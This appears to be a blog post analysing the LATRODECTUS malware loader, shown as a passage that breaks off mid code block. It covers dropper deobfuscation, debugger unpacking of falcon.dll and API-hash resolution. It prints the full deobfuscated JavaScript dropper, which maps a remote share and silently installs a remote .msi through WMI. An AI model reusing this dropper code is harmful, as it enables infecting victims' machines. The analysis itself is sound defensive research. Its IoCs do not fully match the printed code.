    <link rel="manifest" href="/site.webmanifest">

    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000000" />

    <meta name="description" content="goL0: reverse engineering &#43; malware analysis">

    
        <title>goL0: reverse engineering &#43; malware analysis | à¼§</title>
    

    
    <link rel="stylesheet" type="text/css" href="/style.min.50e5dce6bdbdda9c021bb01730b34c1639e90db55e0fd1ed0f37771832d1ce47.css" media="all">
  </head>

  <body>
        
        <nav>
          <ul class="menu">
            
                <li><a tabindex="-1" class="menu-link" href="/about/">about</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/cv/">cv</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/posts/">posts</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/photography/">photography</a></li>
            
          </ul>
        </nav>
        



<div id="single-header">
  <h1>
    goL0: reverse engineering + malware analysis
  </h1>
  <div id="single-meta">
    
    
        <span class="datesub">jan 26, 2024</span>
      

  </div>
</div>



<aside class="toc" id="tableOfContentContainer">
  <nav id="TableOfContents">
  <ul>
    <li><a href="#infection">infection</a></li>
    <li><a href="#stage-1-the-obfuscated-dropper">stage 1: the [obfuscated] dropper</a></li>
    <li><a href="#stage-2-the-unobfuscated-dropper">stage 2: the [unobfuscated] dropper</a></li>
    <li><a href="#stage-3-falcondll">stage 3: <code>falcon.dll</code></a></li>
    <li><a href="#stage-4-the-payload">stage 4: the payload</a></li>
    <li><a href="#functions">functions</a></li>
  </ul>

  <ul>
    <li>
      <ul>
        <li><a href="#follow-the-hash">follow the hash</a></li>
      </ul>
    </li>
    <li><a href="#resolving-modules--functions">resolving modules + functions</a></li>
    <li><a href="#nt-apis">NT APIs</a></li>
    <li><a href="#what-do-these-apis-do">what do these APIs do?</a></li>
  </ul>

  <ul>
    <li><a href="#renaming-remaining-functions">renaming remaining functions</a></li>
    <li><a href="#api-pivoting">API pivoting</a></li>
    <li><a href="#cryptography-refresher-xor-ciphers">cryptography refresher: XOR ciphers</a>
      <ul>
        <li><a href="#xor-ciphers-in-malware">XOR ciphers in malware</a></li>
      </ul>
    </li>
    <li><a href="#string-decryption">string decryption</a></li>
  </ul>

  <ul>
    <li><a href="#detecting-the-tactics--techniques-used-by-latrodectus">detecting the tactics + techniques used by <code>LATRODECTUS</code></a>
      <ul>
        <li><a href="#recap-dynamic-api-resolution--string-decryption">recap: dynamic API resolution + string decryption</a></li>
        <li><a href="#oversized-windows-script-execution">oversized windows script execution</a></li>
        <li><a href="#execution-via-suspicious-wmi-client">execution via suspicious WMI client</a></li>
        <li><a href="#remote-file-execution-via-msiexec">remote file execution via <code>MSIEXEC</code></a></li>
        <li><a href="#rundll32-or-regsvr32-loaded-a-dll-from-unbacked-memory"><code>rundll32</code> or <code>regsvr32</code> loaded a DLL from unbacked memory</a></li>
        <li><a href="#network-module-loaded-from-suspicious-unbacked-memory">network module loaded from suspicious unbacked memory</a></li>
        <li><a href="#shellcode-execution-from-low-reputation-module">shellcode execution from low reputation module</a></li>
        <li><a href="#virtualprotect-api-call-from-an-unsigned-dll"><code>VirtualProtect</code> API call from an unsigned DLL</a></li>
        <li><a href="#scheduled-task-creation-by-an-unusual-process">scheduled task creation by an unusual process</a></li>
        <li><a href="#potential-self-deletion-of-a-running-executable">potential self deletion of a running executable</a></li>
        <li><a href="#long-termhigh-count-of-network-connections-by-rundll32">long-term/high-count of network connections by <code>rundll32</code></a></li>
        <li><a href="#command-shell-activity-started-via-rundll32">command shell activity started via <code>rundll32</code></a></li>
      </ul>
    </li>
    <li><a href="#conclusion">conclusion</a></li>
  </ul>
</nav>
</aside>


<main><p><p class="imgp">
  <img loading="lazy" src="/binja.png" alt="binja"  />
</p>
</p>
<p><code>LATRODECTUS</code> is an emerging malware loader that i first encountered during my research at the start of 2024. initially discovered by walmart&rsquo;s security team, it quickly gained attention due to the similarities it held with <code>ICEDID</code>, particularly in the use of a command handler for downloading and executing encrypted payloads. proofpoint and team cymru both established a link between the network infrastructure used by operators of both <code>LATRODECTUS</code> and <code>ICEDID</code>, suggesting a common origin.</p>
<p><code>LATRODECTUS</code> is a simple + efficient malware, that&rsquo;s part of a new trend in malware development, where the emphasis is on lightweight, direct-action tools. it contains only 11 command handlers, focused on tasks like enumeration + execution.</p>
<h2 id="infection">infection</h2>
<p>infection typically begins with a spam email that points (via URL or PDF) to an oversized JavaScript dropper.</p>
<p>once executed, the dropper leverages WMI [Windows Management Instrumentation] to invoke <code>msiexec.exe</code>, which then downloads + installs an <code>.msi</code> file from a remote WebDAV share.</p>
<p>this <code>.msi</code> file is responsible for executing <code>LATRODECTUS</code> on the target. when the <code>.msi</code> is executed, it executes a packed DLL which further obfuscates its presence by copying itself to a different location and executing from there.</p>
<p>when it&rsquo;s re-executed, the DLL establishes a connection back to the C2 server for further comms.</p>
<h2 id="stage-1-the-obfuscated-dropper">stage 1: the [obfuscated] dropper</h2>
<p>i grabbed the dropper from MalwareBazaar: <code>hxxps[://]bazaar[.]abuse[.]ch/sample/4ff60df7d165862e652f73752eb98cf92202a2d748b055ff1f99d4172fa4c92f/</code></p>
<p>this is a javascript based dropper. it&rsquo;s heavily commented and obfuscated, with real commands being preceded by <code>////</code>.</p>
<p>here&rsquo;s a snapshot of the code.</p>
<p><p class="imgp">
  <img loading="lazy" src="/dropper-obf.png" alt="obfuscated dropper"  />
</p>
</p>
<p>once the pattern is figured out, a regex-based python script is enough to clean it up.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> re
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">extract_code_lines</span>(input_file, output_file):
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># open input file + read all lines</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(input_file, <span style="color:#f1fa8c">&#39;r&#39;</span>) <span style="color:#ff79c6">as</span> file:
</span></span><span style="display:flex;"><span>        lines <span style="color:#ff79c6">=</span> file<span style="color:#ff79c6">.</span>readlines()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># hold the extracted lines of legitimate code</span>
</span></span><span style="display:flex;"><span>    code_lines <span style="color:#ff79c6">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># iterate over each line to determine if it&#39;s legitimate code</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> line <span style="color:#ff79c6">in</span> lines:
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># check if line starts with &#34;////&#34; or doesn&#39;t start with &#34;//&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> line<span style="color:#ff79c6">.</span>startswith(<span style="color:#f1fa8c">&#39;////&#39;</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#6272a4"># remove leading four slashes + any extra spaces, then add to code lines</span>
</span></span><span style="display:flex;"><span>            code_lines<span style="color:#ff79c6">.</span>append(line[<span style="color:#bd93f9">4</span>:]<span style="color:#ff79c6">.</span>lstrip())
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">elif</span> <span style="color:#ff79c6">not</span> line<span style="color:#ff79c6">.</span>startswith(<span style="color:#f1fa8c">&#39;//&#39;</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#6272a4"># if line doesn&#39;t start with &#34;//&#34;, it&#39;s legitimate code, add it as is</span>
</span></span><span style="display:flex;"><span>            code_lines<span style="color:#ff79c6">.</span>append(line)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># write extracted code lines to output file</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(output_file, <span style="color:#f1fa8c">&#39;w&#39;</span>) <span style="color:#ff79c6">as</span> file:
</span></span><span style="display:flex;"><span>        file<span style="color:#ff79c6">.</span>writelines(code_lines)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># example</span>
</span></span><span style="display:flex;"><span>input_file <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;4ff60df7d165862e652f73752eb98cf92202a2d748b055ff1f99d4172fa4c92f.js&#39;</span>  <span style="color:#6272a4"># replace with input file name</span>
</span></span><span style="display:flex;"><span>output_file <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;dropper-clean.js&#39;</span>  <span style="color:#6272a4"># replace with output file name</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>extract_code_lines(input_file, output_file)
</span></span></code></pre></div><p>this script outputs to a cleaned-up file, which is the unobfuscated dropper.</p>
<h2 id="stage-2-the-unobfuscated-dropper">stage 2: the [unobfuscated] dropper</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> network <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ActiveXObject(<span style="color:#f1fa8c">&#34;WScript.Network&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> wmi <span style="color:#ff79c6">=</span> GetObject(<span style="color:#f1fa8c">&#34;winmgmts:\\\\.\\root\\cimv2&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> attempt <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> connected <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">false</span>;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> driveLetter, letter;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">function</span> isDriveMapped(letter) {
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> drives <span style="color:#ff79c6">=</span> network.EnumNetworkDrives();
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> (<span style="color:#8be9fd;font-style:italic">var</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> drives.length; i <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">2</span>) {
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (drives.Item(i) <span style="color:#ff79c6">===</span> letter) {
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">return</span> <span style="color:#ff79c6">true</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> (driveLetter <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">90</span>; driveLetter <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">65</span> <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#ff79c6">!</span>connected; driveLetter<span style="color:#ff79c6">--</span>) {
</span></span><span style="display:flex;"><span>letter <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">String</span>.fromCharCode(driveLetter) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;:&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>isDriveMapped(letter)) {
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>network.MapNetworkDrive(letter, <span style="color:#f1fa8c">&#34;\\\\95.164.3.171@80\\share\\&#34;</span>);
</span></span><span style="display:flex;"><span>connected <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">true</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">break</span>;
</span></span><span style="display:flex;"><span>} <span style="color:#ff79c6">catch</span> (e) {
</span></span><span style="display:flex;"><span>attempt<span style="color:#ff79c6">++</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>connected <span style="color:#ff79c6">&amp;&amp;</span> attempt <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">5</span>) {
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> command <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;net use &#39;</span> <span style="color:#ff79c6">+</span> letter <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39; \\\\95.164.3.171@80\\share\\ /persistent:no&#39;</span>;
</span></span><span style="display:flex;"><span>wmi.Get(<span style="color:#f1fa8c">&#34;Win32_Process&#34;</span>).Create(command, <span style="color:#ff79c6">null</span>, <span style="color:#ff79c6">null</span>, <span style="color:#ff79c6">null</span>);
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> startTime <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Date</span>();
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">while</span> (<span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Date</span>() <span style="color:#ff79c6">-</span> startTime <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">3000</span>) {} 
</span></span><span style="display:flex;"><span>connected <span style="color:#ff79c6">=</span> isDriveMapped(letter);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (connected) {
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> installCommand <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;msiexec.exe /i \\\\95.164.3.171@80\\share\\cisa.msi /qn&#39;</span>;
</span></span><span style="display:flex;"><span>wmi.Get(<span style="color:#f1fa8c">&#34;Win32_Process&#34;</span>).Create(installCommand, <span style="color:#ff79c6">null</span>, <span style="color:#ff79c6">null</span>, <span style="color:#ff79c6">null</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>network.RemoveNetworkDrive(letter, <span style="color:#ff79c6">true</span>, <span style="color:#ff79c6">true</span>);
</span></span><span style="display:flex;"><span>} <span style="color:#ff79c6">catch</span> (e) {
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>} <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>WScript.Echo(<span style="color:#f1fa8c">&#34;Failed.&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> fsObj <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ActiveXObject(<span style="color:#f1fa8c">&#34;Scripting.FileSystemObject&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> selfPath <span style="color:#ff79c6">=</span> WScript.ScriptFullName;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (fsObj.FileExists(selfPath)) {
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">var</span> selfFile <span style="color:#ff79c6">=</span> fsObj.OpenTextFile(selfPath, <span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">var</span> codeToExecute <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">while</span> (<span style="color:#ff79c6">!</span>selfFile.AtEndOfStream) {
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">var</span> currentLine <span style="color:#ff79c6">=</span> selfFile.ReadLine();
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> (currentLine.indexOf(<span style="color:#f1fa8c">&#34;////&#34;</span>) <span style="color:#ff79c6">===</span> <span style="color:#bd93f9">0</span>) {
</span></span><span style="display:flex;"><span>                codeToExecute <span style="color:#ff79c6">+=</span> currentLine.substring(<span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;\n&#34;</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        selfFile.Close();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (codeToExecute) {
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">var</span> executeFunction <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Function</span>(codeToExecute); 
</span></span><span style="display:flex;"><span>            executeFunction();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>} <span style="color:#ff79c6">catch</span> (error) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>the unobfuscated dropper is now ready for analysis. some indicators of compromise (IoCs) to look for are <code>45.95.11.134:80</code> connecting to <code>\share\</code> folder, and using <code>msiexec.exe</code> to grab <code>qual.msi</code> from the above C2 server.</p>
<p>Orca (provided by the Windows SDK) can be used to analyze or edit <code>qual.msi</code>. head over to <code>CustomAction</code> to view the <code>LaunchFile</code> target. this launches a file: <code>rundll32.exe</code>. its export entry is <code>vgml</code> and it&rsquo;s stored at <code>LocalAppDataFolder\stat\falcon.dll</code>.</p>
<p>you could also use UniExtract to extract <code>qual.msi</code>. it will create the directory <code>LocalAppDataFolder\stat\falcon.dll</code>. i copied the DLL to a separate directory for analysis. this commences stage 3.</p>
<h2 id="stage-3-falcondll">stage 3: <code>falcon.dll</code></h2>
<p>this is a packed DLL that contains another DLL inside it, which is the main payload.</p>
<p>you can use x64dbg, IDA, or Binary Ninja to analyze the DLL and payload. i used a combo of IDA and Binary Ninja.</p>
<p>open <code>rundll32.exe</code>. remove all breakpoints and change the command line: remove the old path and add the new path (<code>falcon.dll</code>) and restart.</p>
<p>select <code>user DLL entry</code> and <code>user DLL load</code> in preferences. keep hitting play until the name of the module (<code>falcon.dll</code>) is displayed.</p>
<p>follow the expression <code>vgml</code> (<code>ctrl + g</code>) and set a breakpoint at <code>18000D960</code>.</p>
<p>follow <code>VirtualAlloc</code> and scroll down to find <code>ret</code>. set a breakpoint at <code>7FFA8FCFE5DA</code>.</p>
<p>follow <code>VirtualProtect</code> and set a breakpoint at <code>7FFA90D1BF80</code>.</p>
<p>now, hit play until the first breakpoint (<code>VirtualAlloc ret</code>) is hit. take the <code>RAX</code> value (<code>140FDCD0000</code>) and follow it in Dump #1. hit play again to see the unpacked payload inside the allocated memory.</p>
<p><p class="imgp">
  <img loading="lazy" src="/image.png" alt="unpacked payload inside allocated memory"  />
</p>
</p>
<p>caution: hitting play again would execute the payload. so dump it first by following the address <code>140FDCD0000</code> in Memory Map then dump the memory to a file and save it. this commences stage 4.</p>
<h2 id="stage-4-the-payload">stage 4: the payload</h2>
<p>examine the generated <code>rundll32_00000140FDCD0000.bin</code> in IDA by going to Exports and selecting any of the entries to then open the decompiler. hit <code>run</code> at <code>180003CE4</code>, ordinal 3. enter the functions to check the hashes being declared and resolved to confirm that this is indeed the final payload.</p>
<p>first, make sure everything is decompiled properly: produce file -&gt; create C file [ctrl+f5]. this forces IDA to decompile the binary.</p>
<p>head to exports and select the <code>run</code> function. use the decompiler and disassembly side-by-side (you can hit F5 to open the disassembly window).</p>
<p><p class="imgp">
  <img loading="lazy" src="/image-1.png" alt="decompiler &#43; disassembly"  />
</p>
</p>
<p>enter the first function inside the disassembly: <code>sub_180003CB4();</code>. inside it, there&rsquo;s another function <code>sub_180003868();</code>. enter that. we&rsquo;ll forego the first function [<code>sub_18000AC6C();</code>] for now and head to the second function: <code>sub_180006298();</code>.</p>
<h2 id="functions">functions</h2>
<p><code>sub_180006298();</code> is defined as follows.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#50fa7b">sub_180006298</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)sub_180008388() 
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)sub_18000AA30()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)sub_18000A3F8()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)sub_180008328()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)sub_18000A2D8()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)sub_180008EF0() )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> sub_18000AAAC;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>let&rsquo;s go through each of the functions here and try to decipher what&rsquo;s going on.</p>
<h1 id="sub_180008388"><code>sub_180008388()</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#50fa7b">sub_180008388</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> i; <span style="color:#6272a4">// [rsp+20h] [rbp-28h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; <span style="color:#ff79c6">!</span>i; i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        unk_180010EB0 <span style="color:#ff79c6">=</span> sub_18000821C(<span style="color:#bd93f9">0x2ECA438C</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>unk_180010EB0 )
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h1 id="sub_180000821c"><code>sub_180000821C()</code></h1>
<p>examining <code>sub_180000821C()</code> shows that it iterates through the modules loaded in the executable.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_LIST_ENTRY</span> <span style="color:#ff79c6">*</span><span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_18000821C</span>(<span style="color:#8be9fd">int</span> a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> v2; <span style="color:#6272a4">// [rsp+20h] [rbp-28h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_LIST_ENTRY</span> <span style="color:#ff79c6">*</span>i; <span style="color:#6272a4">// [rsp+28h] [rbp-20h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    _WORD <span style="color:#ff79c6">*</span>v4; <span style="color:#6272a4">// [rsp+30h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> sub_180008534()<span style="color:#ff79c6">-&gt;</span>Ldr<span style="color:#ff79c6">-&gt;</span>InLoadOrderModuleList.Flinkl i[<span style="color:#bd93f9">3</span>].Flink)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        v4 <span style="color:#ff79c6">=</span> sub_18000BB0C((<span style="color:#ff79c6">__int64</span>)i[<span style="color:#bd93f9">6</span>].Flink, LOWORD(i[<span style="color:#bd93f9">5</span>].Blink));
</span></span><span style="display:flex;"><span>        v2 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> sub_18000B8C0((int64)v4);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)sub_180006A14((<span style="color:#ff79c6">__int64</span>)v4, v2) <span style="color:#ff79c6">==</span> a1 )
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> i[<span style="color:#bd93f9">3</span>].Flink;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="follow-the-hash">follow the hash</h3>
<p>there&rsquo;s a hash [<code>0x2ECA438C</code>] being passed to the function <code>unk_180010EB0()</code> via the function <code>sub_18000821C()</code>. we can use this &ldquo;canary&rdquo; of a hash to find out where else it pops up in the program. x64dbg has a fantastic plugin called HashDB Hunt Algorithm. this feature reveals that the the algorithm <code>crc32</code> [32B in size] also contains the hash.</p>
<p>HashDB Lookup is another feature that can find what module this hash corresponds to. it tells us that the hash matches that of <code>kernel32.dll</code>, and adds it to the enums.</p>
<p>so:
<code>0x2ECA438C</code> can now be resolved to the module <code>kernel32.dll</code>; the address <code>sub_180008388()</code> can be resolved to <code>mw_resolve_kernel32.dll</code>; the address <code>unk_180010EB0</code> can be resolved to <code>mw_handle_kernel32_dll</code>. by inference, we can resolve <code>sub_180000821C()</code> to <code>mw_get_module_handle()</code>.</p>
<p>we can now rewrite the function <code>sub_1800008388()</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#50fa7b">mw_resolve_kernel32_dll</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> i; <span style="color:#6272a4">// [rsp+20h] [rbp-28h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; <span style="color:#ff79c6">!</span>i; i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        mw_handle_kernel32_dll <span style="color:#ff79c6">=</span> mw_get_module_handle(kernel32_dll);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>mw_handle_kernel32_dll )
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="resolving-modules--functions">resolving modules + functions</h2>
<p>there is another hash [<code>0x26797E77</code>] being passed to the function <code>unk_180010EB8()</code> via <code>sub_18000821C()</code> (now called <code>mw_get_module_handle()</code>).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#50fa7b">sub_18000AA30</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> i; <span style="color:#6272a4">// [rsp+20h] [rbp-28h]
